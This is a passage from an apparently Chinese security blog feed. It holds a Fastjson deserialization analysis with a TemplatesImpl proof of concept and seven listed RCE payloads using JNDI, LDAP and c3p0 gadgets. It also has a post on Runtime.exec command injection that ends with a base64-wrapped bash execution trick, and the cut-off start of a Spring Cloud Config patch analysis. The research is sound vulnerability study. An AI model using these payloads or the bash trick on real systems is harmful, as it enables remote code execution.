aW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxEZW1vLmphdmEMAAgACQcALwwAMAAxAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAyY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA&#x2F;AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFQAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAYAAgAGQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>



<p>将这串json字符放入fastjson解析，也就是<code>JSON.parse(&quot;{@type: &quot;...&quot;}&quot;, Feature.SupportNonPublicField)</code>就能触发漏洞。</p>
<p>PoC中的关键点：</p>
<ul>
<li><p><code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</p>
</li>
<li><p><code>_bytecodes</code> 是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</p>
</li>
<li><p>需要设置<code>_outputProperties</code>是因为漏洞利用链的关键会调用其参数的<code>getOutputProperties()</code>方法，进而导致命令执行；</p>
</li>
<li><p><code>_tfactory</code>设置为<code>{ }</code>，在<code>defineTransletClasses()</code>时会调用<code>getExternalExtensionsMap()</code>，当为null时会报错，所以要对<code>_tfactory</code>设置；</p>
</li>
</ul>
<p><code>TemplatesImpl</code>调用链的过程：</p>
<ol>
<li><code>TemplatesImpl</code>对象恢复，赋值<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>等私有属性，然后会调用<code>getOutputProperties()</code>这个getter方法</li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-getoutputproperties.png" alt="templatesimpl-getoutputproperties"></p>
<ol start="2">
<li><code>newTransformer()</code>方法调用，方法里调用了<code>getTransletInstance()</code></li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-newtransformer.png" alt="templatesimpl-newtransformer"></p>
<ol start="3">
<li><code>getTransletInstance()</code>方法调用，其中第451行<code>defineTransletClasses()</code>方法中会根据<code>_bytecodes</code>来生成一个java类，生成的java类随后会被<code>getTransletInstance()</code>方法用到生成一个实例。</li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-gettransletinstance.png" alt="templatesimpl-gettransletinstance"></p>
<ol start="4">
<li>生成的Java类，会执行构造函数，也就是<code>Runtime.getRuntime().exec()</code>导致命令执行。</li>
</ol>
<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-demo-runtime.png" alt="templatesimpl-demo-runtime"></p>
<p>整个过程调用栈如下图</p>
<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-stack.png" alt="templatesimpl-stack"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>fastjson中其他链可以参考<code>@type</code>黑名单，项目地址 <a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a> </p>
<p>部分RCE payload记录，来自 <a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">		&quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">	&quot;autoCommit&quot;: true</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">		&quot;_bytecodes&quot;: [	&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ&quot;</span><br><span class="line">		],</span><br><span class="line">		&quot;_name&quot;: &quot;aaa&quot;,</span><br><span class="line">		&quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">		&quot;_outputProperties&quot;: &#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,</span><br><span class="line">		&quot;properties&quot;: &#123;</span><br><span class="line">			&quot;data_source&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload4:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;,</span><br><span class="line">		&quot;targetBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">		&quot;propertyPath&quot;: &quot;foo&quot;,</span><br><span class="line">		&quot;beanFactory&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">			&quot;shareableResources&quot;: [</span><br><span class="line">				&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;</span><br><span class="line">			]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload5:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: Set[</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;,</span><br><span class="line">		&quot;beanFactory&quot;: &#123;</span><br><span class="line">			&quot;@type&quot;: &quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;,</span><br><span class="line">			&quot;shareableResources&quot;: [</span><br><span class="line">				&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">			]</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;adviceBeanName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;obj&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		&quot;@type&quot;: &quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><br><span class="line">	&#125;</span><br><span class="line">]&#125;</span><br><span class="line"></span><br><span class="line">payload6:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">	&quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,</span><br><span class="line">	&quot;userOverridesAsString&quot;: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload7:</span><br><span class="line">&#123;</span><br><span class="line">	&quot;rand1&quot;: &#123;</span><br><span class="line">		&quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">		&quot;jndiName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">		&quot;loginTimeout&quot;: 0</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/</a></p>
<p><a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a></p>
<p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
<p><a href="http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java Runtime.getRuntime().exec()碰到的问题</title>
    <url>/2020/07/18/Java-Runtime.getRuntime.exec/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在CVE-2020-5902 F5-BigIP-TMUI远程代码执行漏洞分析中<code>WorkspaceUtils.saveFile()</code>碰到这么一段代码。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/f5-runtime.png" alt="f5-runtime"></p>
<p>众所周知，<code>Runtime.getRuntime.exec()</code>在Java中用来执行系统命令。<a id="more"></a></p>
<p>本以为Java和其他语言一样可能会导致命令注入的问题，但经过测试发现该处并不能造成任意命令执行，于是对<code>Runtime.getRuntime.exec()</code>进行分析。</p>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><blockquote>
<p>测试时Java版本为1.8.0_221</p>
</blockquote>
<p>先在<code>/tmp</code>目录下新建两个测试文件：<code>test1.txt</code>和<code>test2.txt</code>，此时权限是644（rw-r–r–）</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/before-chmod.png" alt="before-chmod"></p>
<p>为了方便测试，我们将F5中的代码简化一下，代码将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>文件权限变为777</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 777 /tmp/test2.txt"</span>;</span><br><span class="line">		String[] chmodCmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/chmod"</span>, <span class="string">"777"</span>, fileName&#125;;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行代码，发现文件权限并没有变化。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/array-chmod.png" alt="array-chmod"></p>
<p>再使用字符串形式传递command参数，变成如下形式，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 777 /tmp/test2.txt"</span>;</span><br><span class="line">		String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行代码，此时发现两个文件的权限都变成777（rwxrwxrwx）</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/string-chmod.png" alt="string-chmod"></p>
<p>那么是不是可以说明，使用字符串传递command参数就能产生命令注入的漏洞？</p>
<p>并不是这样，我们将执行的命令改成<code>/tmp/test1.txt</code>变为644，<code>/tmp/test2.txt</code>变成700</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/chmod 700 /tmp/test2.txt"</span>;</span><br><span class="line">		String chmodCmd = <span class="string">"/bin/chmod 644 "</span> + fileName;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行代码，发现都变成了644（rw-r–r–），而不是一个644，一个700。具体原因在分析章节中会讲到。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/diff-string-chmod.png" alt="diff-string-chmod.png"></p>
<p>我们再来看下面一个例子，将<code>/tmp/test1.txt</code>文件权限变为777，另外在<code>/tmp/</code>中新建一个名为<code>seikei</code>的文件夹。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">		String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行代码，此时仅是<code>/tmp/test1.txt</code>权限改成777，并没有生成<code>/tmp/seikei</code>文件夹。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/chmod-mkdir.png" alt="chmod-mkdir"></p>
<p>那么为什么会导致以上现象发生，下面我们通过代码来分析一下。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先来看<code>Runtime.getRuntime.exec()</code>的代码，<code>Runtime.getRuntime.exec()</code>有以下六种重载方法，虽然应用程序可能会调用不同的重载方法，最终都会执行到<code>public Process exec(String[] cmdarray, String[] envp, File dir)</code></p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/runtime-getRuntime-exec.png" alt="runtime-getRuntime-exec"></p>
<p>先来看第三个<code>public Process exec(String command, String[] envp, File dir)</code>，也就是传入将命令以字符串的形式传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">	<span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (command.length() == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Empty command"</span>);</span><br><span class="line"></span><br><span class="line">	StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">	String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">		cmdarray[i] = st.nextToken();</span><br><span class="line">	<span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>其中将字符串形式的command参数使用<code>StringTokenizer</code>类进行实例化，<code>StringTokenizer</code>用于构造一个字符串分词器，它根据指定字符将字符串分成字符串数组，指定字符为：空格等字符（ascii十进制数值在32以下）、制表符（\t）、换行符（\n）、回车符（\r）、换页符（\f）</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/StringTokenizer.png" alt="StringTokenizer"></p>
<p>我们先使用字符串形式传递command参数，进行调试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">		String chmodCmd = <span class="string">"/bin/chmod 777 "</span> + fileName;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到<code>/bin/chmod 777 /tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>被转换成cmdarray[6]，也就是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code></p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/command-string.png" alt="command-string"></p>
<p>我们再使用字符串数组的格式，对比一下两者的差别</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkspaceUtils</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		String fileName= <span class="string">"/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei"</span>;</span><br><span class="line">		String[] chmodCmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/chmod"</span>, <span class="string">"777"</span>, fileName&#125;;</span><br><span class="line">		Runtime.getRuntime().exec(chmodCmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时为cmdarray[3]，也就是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei&quot;]</code>，这是Java命令执行中第一个需要注意的点。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/command-array.png" alt="command-array"></p>
<p>不管传入的是字符串命令还是字符串数组命令，都会将传入的命令统一转换成cmdarray[]也就是字符串数组，之后再将转换成字符串数组的命令使用<code>ProcessBuilder</code>处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">	<span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">		.environment(envp)</span><br><span class="line">		.directory(dir)</span><br><span class="line">		.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>ProcessBuilder.start()</code>中又会调用<code>ProcessImpl.start()</code>，在<code>ProcessImpl.start()</code>中创建一个<code>UNIXProcess</code>（调试环境为Mac OS，所以是起一个Unix进程）执行命令。其中过程非常简单不过多赘述，需要注意的是<code>UNIXProcess</code>的参数，其中第一个参数<code>toCString(cmdarray[0])</code>就是我们传入的cmdarray数组中第一个元素，也就是需执行的命令。而cmdarray数组中剩余的元素则放在<code>argBlock</code>中。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/UNIXProcess.png" alt="UNIXProcess"></p>
<p>也就是说只要我们无法控制被执行命令的第一个元素，就无法控制<code>Runtime.getRuntime().exec()</code>中执行的命令，因为后续的元素都将会是第一个元素所代表的命令的参数。</p>
<p>就拿我们之前的命令举例：<code>/bin/chmod 777 /tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code></p>
<p>若以字符串形式传入<code>Runtime.getRuntime().exec()</code>，会被解析成<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code></p>
<p>此时，执行的命令是<code>/bin/chmod</code>，数组后面的所有元素都会被当作该<strong>命令的参数</strong>去执行，而不会因为<code>&amp;&amp;</code>而被解析成两条语句。这里特别需要理解<strong>命令的参数</strong>是什么意思？使用<code>man chmod</code>查看<code>chmod</code>命令的详细解释，其中<code>SYNOPSIS</code>中<code>chmod</code>后面的内容都是参数。</p>
<p><img src="/2020/07/18/Java-Runtime.getRuntime.exec/man-chmod.png" alt="man-chmod"></p>
<p>此时<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/mkdir&quot;,&quot;/tmp/seikei&quot;]</code>仅仅执行到了<code>/bin/chmod 777 /tmp/test1.txt</code>，后面的<code>&amp;&amp; /bin/mkdir /tmp/seikei</code>会被认为是错误的语法而不执行。</p>
<p>但是在第二个测试案例<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test2.txt&quot;]</code>中<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>都是存在的，因为命令存在一定的容错性，所以等于执行的是<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt&quot;,&quot;/tmp/test2.txt&quot;]</code>，也就是将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>的权限同时改为777。</p>
<p>第三个测试案例<code>[&quot;/bin/chmod&quot;,&quot;644&quot;,&quot;/tmp/test1.txt&quot;,&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;700&quot;,&quot;/tmp/test2.txt&quot;]</code>也就将<code>/tmp/test1.txt</code>和<code>/tmp/test2.txt</code>的权限同时改为644，而不是一个644，一个700。因为<code>[&quot;&amp;&amp;&quot;,&quot;/bin/chmod&quot;,&quot;700&quot;]</code>在这里是没有起到任何作用的。</p>
<p>我们再来看若命令以数组形式传递进来，<code>[&quot;/bin/chmod&quot;,&quot;777&quot;,&quot;/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei&quot;]</code></p>
<p>此时<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>会被当作file参数，也就是更改<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>这个文件的权限，但是<code>/tmp/test1.txt &amp;&amp; /bin/mkdir /tmp/seikei</code>该文件是不存在的，因为有空格和<code>&amp;</code>符号，所以执行不会有结果。</p>
<p>那么，只要Java中的<code>Runtime.getRuntime().exec()</code>第一个字段不可控，就一定不会造成危害吗？</p>
<p>不是的，还可以考虑该命令是否存在参数注入的问题。若第一个字段是执行bash命令，也可以尝试base64等编码形式同时执行多条语句。</p>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>由于Java的安全设计，已经尽可能规避了命令执行的风险。执行命令时仅仅将命令数组中第一个元素作为操作系统的进程去执行，其后全部元素都是该进程的参数。</p>
<p>若是使用数组形式传递命令，数组中单个元素只作为单一参数去执行，不会因为空格等字符就分开执行。</p>
<p>若是<code>/bin/bash</code>形式的命令执行，仍可以用<code>bash -c {echo,base64的payload}|{base64,-d}|{bash,-i}</code>执行多条命令。</p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-5410 Spring Cloud Config目录遍历漏洞（新）</title>
    <url>/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/</url>
    <content><![CDATA[<p>Spring Cloud Config，2.2.3之前的2.2.x版本，2.1.9之前的2.1.x版本以及较旧的不受支持的版本允许应用程序通过spring-cloud-config-server模块提供任意配置文件。</p>
<a id="more"></a>

<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p><a href="https://github.com/spring-cloud/spring-cloud-config/compare/v2.2.2.RELEASE...v2.2.3.RELEASE" target="_blank" rel="noopener">对比2.2.2和2.2.3版本</a>，发现其中有两个commits似乎和漏洞修复有关。</p>
<p><img src="/2020/07/03/CVE-2020-5410_Spring_Cloud_Config_Directory_Traversal_New/commits.png" alt="commits"></p>
<p><a href="https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c" target="_blank" rel="noopener">查看对比</a>发现在<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/environment/EnvironmentController.java</code>中多了一个<code>pathUtils.isInvalidEncodedLocation</code>判断。</p>
